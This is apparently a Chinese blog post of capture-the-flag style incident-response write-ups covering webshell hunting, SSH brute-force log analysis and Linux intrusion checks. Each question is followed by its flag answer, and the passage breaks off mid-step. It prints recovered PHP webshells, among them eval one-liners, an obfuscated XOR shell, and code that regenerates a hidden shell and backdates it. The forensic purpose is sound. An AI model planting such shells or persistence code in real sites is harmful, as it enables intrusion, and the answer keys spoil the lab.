    <content type="html"><![CDATA[<p>webshell æŸ¥æ€ &amp; Linux æ—¥å¿—åˆ†æ &amp; Linux å…¥ä¾µæ’æŸ¥</p><span id="more"></span><h1 id="æŸ¥æ‰¾-shell-æ–¹æ³•"><a href="#æŸ¥æ‰¾-shell-æ–¹æ³•" class="headerlink" title="æŸ¥æ‰¾ shell æ–¹æ³•"></a>æŸ¥æ‰¾ shell æ–¹æ³•</h1><p>æŸ¥æ‰¾æœ‰ Webshell ç‰¹å¾çš„æ–‡ä»¶å†…å®¹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">find ./ <span class="hljs-built_in">type</span> f -name <span class="hljs-string">&quot;.jsp&quot;</span> | xargs grep <span class="hljs-string">&quot;exec(&quot;</span><br>find ./ <span class="hljs-built_in">type</span> f -name <span class="hljs-string">&quot;.php&quot;</span> | xargs grep <span class="hljs-string">&quot;eval(&quot;</span><br>find ./ <span class="hljs-built_in">type</span> f -name <span class="hljs-string">&quot;.asp&quot;</span> | xargs grep <span class="hljs-string">&quot;execute(&quot;</span><br>find ./ <span class="hljs-built_in">type</span> f -name <span class="hljs-string">&quot;.aspx&quot;</span> | xargs grep <span class="hljs-string">&quot;eval(&quot;</span><br></code></pre></td></tr></table></figure><p>å¯¹äºå…æ€ Webshellï¼Œå¯ä»¥æŸ¥çœ‹æ˜¯å¦ä½¿ç”¨ç¼–ç </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">find ./ <span class="hljs-built_in">type</span> f -name <span class="hljs-string">&quot;*.php&quot;</span> | xargs grep <span class="hljs-string">&quot;base64_decode&quot;</span><br></code></pre></td></tr></table></figure><h1 id="Linux-æ—¥å¿—åˆ†æ"><a href="#Linux-æ—¥å¿—åˆ†æ" class="headerlink" title="Linux æ—¥å¿—åˆ†æ"></a>Linux æ—¥å¿—åˆ†æ</h1><h2 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h2><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">è´¦å· root å¯†ç  linuxrz<br>ssh root@<span class="hljs-built_in">IP</span><br><span class="hljs-number">1</span>.æœ‰å¤šå°‘<span class="hljs-built_in">IP</span>åœ¨çˆ†ç ´ä¸»æœºsshçš„rootå¸å·ï¼Œå¦‚æœæœ‰å¤šä¸ªä½¿ç”¨<span class="hljs-string">&quot;,&quot;</span>åˆ†å‰²<br><span class="hljs-number">2.</span>sshçˆ†ç ´æˆåŠŸç™»é™†çš„<span class="hljs-built_in">IP</span>æ˜¯å¤šå°‘ï¼Œå¦‚æœæœ‰å¤šä¸ªä½¿ç”¨<span class="hljs-string">&quot;,&quot;</span>åˆ†å‰²<br><span class="hljs-number">3</span>.çˆ†ç ´ç”¨æˆ·åå­—å…¸æ˜¯ä»€ä¹ˆï¼Ÿå¦‚æœæœ‰å¤šä¸ªä½¿ç”¨<span class="hljs-string">&quot;,&quot;</span>åˆ†å‰²<br><span class="hljs-number">4</span>.ç™»é™†æˆåŠŸçš„<span class="hljs-built_in">IP</span>å…±çˆ†ç ´äº†å¤šå°‘æ¬¡<br><span class="hljs-number">5</span>.é»‘å®¢ç™»é™†ä¸»æœºåæ–°å»ºäº†ä¸€ä¸ªåé—¨ç”¨æˆ·ï¼Œç”¨æˆ·åæ˜¯å¤šå°‘<br></code></pre></td></tr></table></figure><h2 id="Q1"><a href="#Q1" class="headerlink" title="Q1"></a>Q1</h2><p>Linux é»˜è®¤æ—¥å¿—å­˜æ”¾åœ¨ <code>/var/log</code> ç›®å½•ä¸‹ï¼Œæ‰€ä»¥ç›´æ¥è¿›å…¥</p><p><img src="https://img.dkdun.cn/v1/2025/12/76c546db2b1372b4.png"></p><p>å‘ç°æœ‰å¾ˆå¤šæ—¥å¿—æ–‡ä»¶ï¼Œ<code>auth.log.1</code> æ–‡ä»¶æ˜¯ä¸€ä¸ªéå¸¸é‡è¦çš„ç³»ç»Ÿæ—¥å¿—æ–‡ä»¶ï¼ŒåŒ…å«äº†è®¸å¤šä¸å®‰å…¨ç›¸å…³çš„ä¿¡æ¯ï¼Œå¯ä»¥ç”¨äºç›‘æ§ã€åˆ†æå’Œæ’æŸ¥ç³»ç»Ÿæ•…éšœå’Œå®‰å…¨é—®é¢˜ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥æŸ¥çœ‹å®ƒçš„å†…å®¹ä¿¡æ¯ï¼Œæ ¹æ®é¢˜ç›®æ¥çœ‹åœ¨çˆ†ç ´ root è´¦å·ï¼Œé‚£ä¹ˆå¯ä»¥ <code>grep</code> è¿‡æ»¤ä¸€äº›</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> auth.log.1 | grep -a <span class="hljs-string">&quot;Failed password for root&quot;</span><br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/daa25390b87f2a2f.png"></p><p>æ‰¾åˆ°ä¸‰ä¸ª IPï¼š192.168.200.32ï¼Œ192.168.200.2ï¼Œ192.168.200.31</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;<span class="hljs-number">192.168.200.2</span>,<span class="hljs-number">192.168.200.31</span>,<span class="hljs-number">192.168.200.32</span>&#125;<br></code></pre></td></tr></table></figure><h2 id="Q2"><a href="#Q2" class="headerlink" title="Q2"></a>Q2</h2><p>éœ€è¦æŸ¥çœ‹æˆåŠŸç™»å½•çš„ IP</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> auth.log.1 | grep -a <span class="hljs-string">&quot;Accepted&quot;</span><br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/55b06204f84935bf.png"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;<span class="hljs-number">192.168.200.2</span>&#125;<br></code></pre></td></tr></table></figure><h2 id="Q3"><a href="#Q3" class="headerlink" title="Q3"></a>Q3</h2><p>å¯¹ç™»é™†å¤±è´¥çš„ç”¨æˆ·åè¿›è¡ŒæŸ¥æ‰¾</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> auth.log.1 | grep -a <span class="hljs-string">&quot;Failed password&quot;</span><br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/ef2709c7e4dc3737.png"></p><p>å¯ä»¥å‘ç°æœ‰ 6 ä¸ªç”¨æˆ·ï¼štest1ã€test2ã€test3ã€rootã€userã€hello</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">flag&#123;<span class="hljs-keyword">user</span>,hello,root,test3,test2,test1&#125;<br></code></pre></td></tr></table></figure><h2 id="Q4"><a href="#Q4" class="headerlink" title="Q4"></a>Q4</h2><p>å‰é¢ Q2 å·²ç»æŸ¥æ‰¾åˆ°äº† IP <code>192.168.200.2</code> æ˜¯ç™»é™†æˆåŠŸäº†çš„ï¼Œæ‰€ä»¥è¿™é‡Œçœ‹ 192.168.200.2 çš„æ¬¡æ•°å°±æ­£ç¡®</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> auth.log.1 | grep -a <span class="hljs-string">&quot;Failed password for root&quot;</span><br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/dbca134151e16bd1.png"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;<span class="hljs-number">4</span>&#125;<br></code></pre></td></tr></table></figure><h2 id="Q5"><a href="#Q5" class="headerlink" title="Q5"></a>Q5</h2><p>é¢˜ç›®è¯´æ–°å»ºäº†ä¸€ä¸ªç”¨æˆ·ï¼ŒæŸ¥æ‰¾ <code>new user</code> </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> auth.log.1 | grep -a <span class="hljs-string">&quot;new user&quot;</span><br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/86b14ffe43a8a247.png"></p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">flag</span><span class="hljs-template-variable">&#123;test2&#125;</span><br></code></pre></td></tr></table></figure><h1 id="webshell-æŸ¥æ€"><a href="#webshell-æŸ¥æ€" class="headerlink" title="webshell æŸ¥æ€"></a>webshell æŸ¥æ€</h1><h2 id="ç®€ä»‹-1"><a href="#ç®€ä»‹-1" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h2><figure class="highlight q"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs q">é¶æœºè´¦å·å¯†ç  root xjwebshell<br><span class="hljs-number">1.</span>é»‘å®¢webshellé‡Œé¢çš„flag flag&#123;xxxxx-xxxx-xxxx-xxxx-xxxx&#125;<br><span class="hljs-number">2.</span>é»‘å®¢ä½¿ç”¨çš„ä»€ä¹ˆå·¥å…·çš„shell githubåœ°å€çš„<span class="hljs-built_in">md5</span> flag&#123;<span class="hljs-built_in">md5</span>&#125;<br><span class="hljs-number">3.</span>é»‘å®¢éšè—shellçš„å®Œæ•´è·¯å¾„çš„<span class="hljs-built_in">md5</span> flag&#123;<span class="hljs-built_in">md5</span>&#125; æ³¨ : /xxx/xxx/xxx/xxx/xxx.xxx<br><span class="hljs-number">4.</span>é»‘å®¢å…æ€é©¬å®Œæ•´è·¯å¾„ <span class="hljs-built_in">md5</span> flag&#123;<span class="hljs-built_in">md5</span>&#125;<br></code></pre></td></tr></table></figure><h2 id="Q1-1"><a href="#Q1-1" class="headerlink" title="Q1"></a>Q1</h2><p>ä¸€èˆ¬æ¥è¯´ç½‘é¡µæ–‡ä»¶ä¸€èˆ¬åœ¨ <code>/var/www/html</code> è·¯å¾„ä¸‹ï¼Œå¯ä»¥è¿›å…¥ç›®å½•æŸ¥æ‰¾ï¼Œ<code>php</code> æ–‡ä»¶æŸ¥æ‰¾å±é™©å‡½æ•° <code>eval()</code> </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">find ./ -name <span class="hljs-string">&quot;*.php&quot;</span> | xargs grep <span class="hljs-string">&quot;eval(&quot;</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@ip-10-0-10-1:/var/www/html# find ./ -name <span class="hljs-string">&quot;*.php&quot;</span> | xargs grep <span class="hljs-string">&quot;eval(&quot;</span><br>./include/gz.php:               <span class="hljs-built_in">eval</span>(<span class="hljs-variable">$payload</span>);<br>./include/Db/.Mysqli.php:               <span class="hljs-built_in">eval</span>(<span class="hljs-variable">$payload</span>);<br>./shell.php:&lt;?php phpinfo();@<span class="hljs-built_in">eval</span>(<span class="hljs-variable">$_REQUEST</span>[1]);?&gt;<br></code></pre></td></tr></table></figure><p>æŸ¥çœ‹ gz.php å†…å®¹</p><p><img src="https://img.dkdun.cn/v1/2025/12/aaf79b903e9214fd.png"></p><p>æ‹¿åˆ° flag</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs maxima">flag&#123;<span class="hljs-number">027ccd04</span>-<span class="hljs-number">5065</span>-<span class="hljs-number">48b6</span>-a32d-77c704a5e26d&#125;<br></code></pre></td></tr></table></figure><h2 id="Q2-1"><a href="#Q2-1" class="headerlink" title="Q2"></a>Q2</h2><p>å¯ä»¥çœ‹åˆ° webshell å†…å®¹ä¸­æœ‰</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">@<span class="hljs-title function_ invoke__">session_start</span>();<span class="hljs-comment">//åˆ›å»ºæˆ–è€…é‡å¯ä¸€ä¸ªä¼šè¯</span><br>@<span class="hljs-title function_ invoke__">set_time_limit</span>(<span class="hljs-number">0</span>);<span class="hljs-comment">//è®¾ç½®ç¨‹åºæœ€é•¿è¿è¡Œæ—¶é—´ï¼šæ°¸ä¹…</span><br>@<span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<span class="hljs-comment">// å…³é—­é”™è¯¯æŠ¥å‘Š</span><br></code></pre></td></tr></table></figure><p>è¿™æ˜¯å“¥æ–¯æ‹‰ç”Ÿæˆçš„ webshell ç‰¹å¾ï¼Œå“¥æ–¯æ‹‰é¡¹ç›®åœ°å€ï¼š<a href="https://github.com/BeichenDream/Godzilla">https://github.com/BeichenDream/Godzilla</a></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;<span class="hljs-number">39392</span>de3218c333f794befef07ac9257&#125;<br></code></pre></td></tr></table></figure><h2 id="Q3-1"><a href="#Q3-1" class="headerlink" title="Q3"></a>Q3</h2><p>å¯»æ‰¾éšè— shellï¼Œåœ¨ Q1 ä¸­æœ‰å±é™©å‡½æ•°çš„è¿˜æœ‰å…¶ä»–æ–‡ä»¶ï¼Œè®¿é—®ç›®å½•æŸ¥æ‰¾</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./include/Db/.Mysqli.php<br></code></pre></td></tr></table></figure><p>å¯¹è·¯å¾„ <code>/var/www/html/include/Db/.Mysqli.php</code> è¿›è¡Œ md5 åŠ å¯†</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs elixir">root<span class="hljs-variable">@ip</span><span class="hljs-number">-10</span><span class="hljs-number">-0</span><span class="hljs-number">-10</span><span class="hljs-number">-1</span><span class="hljs-symbol">:/var/www/html/include/Db</span><span class="hljs-comment"># echo -n &quot;/var/www/html/include/Db/.Mysqli.php&quot; |md5sum |cut -d &quot; &quot; -f1</span><br>aebac0e58cd6c5fad1695ee4d1ac1919<br></code></pre></td></tr></table></figure><p>å¾—åˆ° flag</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">flag</span><span class="hljs-template-variable">&#123;aebac0e58cd6c5fad1695ee4d1ac1919&#125;</span><br></code></pre></td></tr></table></figure><h2 id="Q4-1"><a href="#Q4-1" class="headerlink" title="Q4"></a>Q4</h2><p>å…æ€é©¬é€šè¿‡é™æ€æ£€æµ‹æ˜¯æ£€æµ‹ä¸åˆ°çš„ï¼Œå› ä¸ºåœ¨å…æ€çš„è¿‡ç¨‹ä¸­å°† webshell çš„ç‰¹å¾å€¼ä»¥åŠç‰¹å¾å‡½æ•°éƒ½ç»™å»æ‰äº†ï¼Œä½†æ˜¯ webshell æ‰§è¡Œä¼šåœ¨ç½‘ç«™æ—¥å¿—ç•™ä¸‹è®°å½•ï¼Œæ‰€ä»¥å¯ä»¥åˆ°æ—¥å¿—é‡Œé¢çœ‹æœ‰æ— å¯ç–‘è®°å½•</p><p>ç›®å½•ä¸‹æœ‰ <code>apache2</code> æ—¥å¿—è®°å½•ï¼Œç„¶åæŸ¥çœ‹å…¶ç›®å½•ä¸‹çš„ <code>access.log</code> æ–‡ä»¶</p><p><img src="https://img.dkdun.cn/v1/2025/12/133ef6fc18302b15.png"></p><p>å¯ä»¥çœ‹åˆ° <code>/wap</code> ä¸‹çš„ top.php æ–‡ä»¶æ‰§è¡Œäº†ä¸¤æ¬¡ <code>phpinfo()</code> </p><p><img src="https://img.dkdun.cn/v1/2025/12/f9ff2a9d776dfeed.png"></p><p>æŸ¥çœ‹ top.php æ–‡ä»¶</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$key</span> = <span class="hljs-string">&quot;password&quot;</span>;<br><br><span class="hljs-comment">//ERsDHgEUC1hI</span><br><span class="hljs-variable">$fun</span> = <span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;func&#x27;</span>]);<br><span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$fun</span>);<span class="hljs-variable">$i</span>++)&#123;<br>    <span class="hljs-variable">$fun</span>[<span class="hljs-variable">$i</span>] = <span class="hljs-variable">$fun</span>[<span class="hljs-variable">$i</span>]^<span class="hljs-variable">$key</span>[<span class="hljs-variable">$i</span>+<span class="hljs-number">1</span>&amp;<span class="hljs-number">7</span>];<br>&#125;<br><span class="hljs-variable">$a</span> = <span class="hljs-string">&quot;a&quot;</span>;<br><span class="hljs-variable">$s</span> = <span class="hljs-string">&quot;s&quot;</span>;<br><span class="hljs-variable">$c</span>=<span class="hljs-variable">$a</span>.<span class="hljs-variable">$s</span>.<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;func2&quot;</span>];<br></code></pre></td></tr></table></figure><p>æ˜¯å…æ€é©¬äº†ï¼Œmd5 åŠ å¯†<code>/var/www/html/wap/top.php</code></p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">flag</span><span class="hljs-template-variable">&#123;eeff2eabfd9b7a6d26fc1a53d3f7d1de&#125;</span><br></code></pre></td></tr></table></figure><h1 id="Linux-å…¥ä¾µæ’æŸ¥"><a href="#Linux-å…¥ä¾µæ’æŸ¥" class="headerlink" title="Linux å…¥ä¾µæ’æŸ¥"></a>Linux å…¥ä¾µæ’æŸ¥</h1><h2 id="ç®€ä»‹-2"><a href="#ç®€ä»‹-2" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h2><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">è´¦å·ï¼šroot å¯†ç ï¼šlinuxruqin<br>ssh root@<span class="hljs-built_in">IP</span><br><span class="hljs-number">1.</span>webç›®å½•å­˜åœ¨æœ¨é©¬ï¼Œè¯·æ‰¾åˆ°æœ¨é©¬çš„å¯†ç æäº¤<br><span class="hljs-number">2</span>.æœåŠ¡å™¨ç–‘ä¼¼å­˜åœ¨ä¸æ­»é©¬ï¼Œè¯·æ‰¾åˆ°ä¸æ­»é©¬çš„å¯†ç æäº¤<br><span class="hljs-number">3</span>.ä¸æ­»é©¬æ˜¯é€šè¿‡å“ªä¸ªæ–‡ä»¶ç”Ÿæˆçš„ï¼Œè¯·æäº¤æ–‡ä»¶å<br><span class="hljs-number">4</span>.é»‘å®¢ç•™ä¸‹äº†æœ¨é©¬æ–‡ä»¶ï¼Œè¯·æ‰¾å‡ºé»‘å®¢çš„æœåŠ¡å™¨<span class="hljs-built_in">ip</span>æäº¤<br><span class="hljs-number">5</span>.é»‘å®¢ç•™ä¸‹äº†æœ¨é©¬æ–‡ä»¶ï¼Œè¯·æ‰¾å‡ºé»‘å®¢æœåŠ¡å™¨å¼€å¯çš„ç›‘ç«¯å£æäº¤<br></code></pre></td></tr></table></figure><h2 id="Q1-2"><a href="#Q1-2" class="headerlink" title="Q1"></a>Q1</h2><p>è¿›å…¥ web ç›®å½•æŸ¥æ‰¾</p><p><img src="https://img.dkdun.cn/v1/2025/12/bea3ad8f80ca3f88.png"></p><p>ä¸€èˆ¬æ¥è¯´ php æ–‡ä»¶æ¯”è¾ƒå¯ç–‘ï¼ŒæŸ¥çœ‹ <code>1.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-number">1</span>]);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>æ‹¿åˆ° flag</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;<span class="hljs-number">1</span>&#125;<br></code></pre></td></tr></table></figure><h2 id="Q2-2"><a href="#Q2-2" class="headerlink" title="Q2"></a>Q2</h2><p>è¿‡æ»¤ php æ–‡ä»¶</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@ip-10-0-10-7:/var/www/html# find ./ -name <span class="hljs-string">&quot;*php&quot;</span> | xargs grep <span class="hljs-string">&quot;eval(&quot;</span><br>./.shell.php:&lt;?php <span class="hljs-keyword">if</span>(md5(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;pass&quot;</span>])==<span class="hljs-string">&quot;5d41402abc4b2a76b9719d911017c592&quot;</span>)&#123;@<span class="hljs-built_in">eval</span>(<span class="hljs-variable">$_POST</span>[cmd]);&#125;?&gt;<br>./index.php:<span class="hljs-variable">$code</span> = <span class="hljs-string">&#x27;&lt;?php if(md5($_POST[&quot;pass&quot;])==&quot;5d41402abc4b2a76b9719d911017c592&quot;)&#123;@eval($_POST[cmd]);&#125;?&gt;&#x27;</span>;<br>./1.php:&lt;?php <span class="hljs-built_in">eval</span>(<span class="hljs-variable">$_POST</span>[1]);?&gt;<br></code></pre></td></tr></table></figure><p>md5 è§£å¯†</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">flag</span><span class="hljs-template-variable">&#123;hello&#125;</span><br></code></pre></td></tr></table></figure><h2 id="Q3-2"><a href="#Q3-2" class="headerlink" title="Q3"></a>Q3</h2><p>å› ä¸ºå‰é¢æ˜¾ç¤º <code>index.php</code> æ–‡ä»¶ä¸­ä¹Ÿæœ‰æœ¨é©¬å¯†ç ï¼Œæ‰€ä»¥æŸ¥çœ‹ä¸€ä¸‹æ–‡ä»¶</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;config.php&#x27;</span>);<br><span class="hljs-keyword">include</span>(SYS_ROOT.INC.<span class="hljs-string">&#x27;common.php&#x27;</span>);<br><span class="hljs-variable">$path</span>=<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;PATH_INFO&#x27;</span>].(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;QUERY_STRING&#x27;</span>]?<span class="hljs-string">&#x27;?&#x27;</span>.<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;?&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;QUERY_STRING&#x27;</span>]):<span class="hljs-string">&#x27;&#x27;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$path</span>, <span class="hljs-number">0</span>,<span class="hljs-number">1</span>)==<span class="hljs-string">&#x27;/&#x27;</span>)&#123;<br>        <span class="hljs-variable">$path</span>=<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$path</span>,<span class="hljs-number">1</span>);<br>&#125;<br><span class="hljs-variable">$path</span> = <span class="hljs-title class_">Base</span>::<span class="hljs-title function_ invoke__">safeword</span>(<span class="hljs-variable">$path</span>);<br><span class="hljs-variable">$ctrl</span>=<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;action&#x27;</span>])?<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;action&#x27;</span>]:<span class="hljs-string">&#x27;run&#x27;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;createprocess&#x27;</span>]))<br>&#123;<br>        <span class="hljs-title class_">Index</span>::<span class="hljs-title function_ invoke__">createhtml</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>])?<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>]:<span class="hljs-number">0</span>,<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cat&#x27;</span>],<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;single&#x27;</span>]);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-title class_">Index</span>::<span class="hljs-title function_ invoke__">run</span>(<span class="hljs-variable">$path</span>);<br>&#125;<br><span class="hljs-variable">$file</span> = <span class="hljs-string">&#x27;/var/www/html/.shell.php&#x27;</span>;<br><span class="hljs-variable">$code</span> = <span class="hljs-string">&#x27;&lt;?php if(md5($_POST[&quot;pass&quot;])==&quot;5d41402abc4b2a76b9719d911017c592&quot;)&#123;@eval($_POST[cmd]);&#125;?&gt;&#x27;</span>;<br><span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$file</span>, <span class="hljs-variable">$code</span>);<br><span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;touch -m -d &quot;2021-01-01 00:00:01&quot; .shell.php&#x27;</span>);<br><span class="hljs-title function_ invoke__">usleep</span>(<span class="hljs-number">3000</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>èƒ½çœ‹è§é€šè¿‡è¿™ä¸ªæ–‡ä»¶ç”Ÿæˆäº†ä¸æ­»é©¬</p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs axapta">flag&#123;<span class="hljs-keyword">index</span>.php&#125;<br></code></pre></td></tr></table></figure><h2 id="Q4-2"><a href="#Q4-2" class="headerlink" title="Q4"></a>Q4</h2><p>åœ¨ web ç›®å½•ä¸‹æ˜¯æœ‰ä¸€ä¸ªå¯ç–‘çš„  <code>&#39;shell(1).elf&#39;</code> æ–‡ä»¶ï¼Œèµ‹äºˆæƒé™ç„¶åè¿è¡Œ</p><p><img src="https://img.dkdun.cn/v1/2025/12/83dad8b4b4fba1d9.png"></p><p>è™½ç„¶æ²¡æœ‰å›æ˜¾ï¼Œä½†æ˜¯å¯ä»¥å†å¼€ä¸€ä¸ªç»ˆç«¯ï¼Œç„¶åæŸ¥æ‰¾è¿æ¥æƒ…å†µ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">netstat -antpl<br><br><span class="hljs-comment"># -aï¼šæ˜¾ç¤ºæ‰€æœ‰è¿æ¥ä¸­çš„ç«¯å£ï¼ŒåŒ…æ‹¬ç›‘å¬å’Œéç›‘å¬ã€‚</span><br><span class="hljs-comment"># -nï¼šä»¥æ•°å­—å½¢å¼æ˜¾ç¤ºåœ°å€å’Œç«¯å£å·ï¼Œè€Œä¸æ˜¯å°†å…¶è§£æä¸ºä¸»æœºåæˆ–æœåŠ¡åã€‚</span><br><span class="hljs-comment"># -tï¼šæ˜¾ç¤º TCP è¿æ¥ã€‚</span><br><span class="hljs-comment"># -pï¼šæ˜¾ç¤ºä½¿ç”¨æ¯ä¸ªå¥—æ¥å­—çš„ç¨‹åºã€‚</span><br><span class="hljs-comment"># 